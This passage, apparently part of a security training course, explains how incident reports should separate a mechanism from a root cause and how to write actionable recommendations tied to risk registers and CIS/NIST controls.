+The distinction between a mechanism and a root cause is worth dwelling on, because it is the difference between a report that gets a control fixed and one that gets filed.
+
+| Statement | Which is it? |
+|---|---|
+| “A user clicked a link” | Mechanism — true, but it names no fixable control |
+| “Credential phishing succeeded because MFA was not enforced on this account” | Root cause — names the gap that can be closed |
+
+Likewise, recommendation quality is a test:
+
+| Recommendation | Verdict |
+|---|---|
+| “Improve security” | A wish |
+| “Enforce MFA on all accounts by [date], owner [team], addressing the gap that allowed this” | Actionable: specific, prioritised, owned |
+
+The GRC connection is direct. Recommendations become risk register entries, and the controls that address them map to CIS or NIST — which is the phase's final deliverable, the five-risk control-mapping table.
 
 ### Key takeaways
 
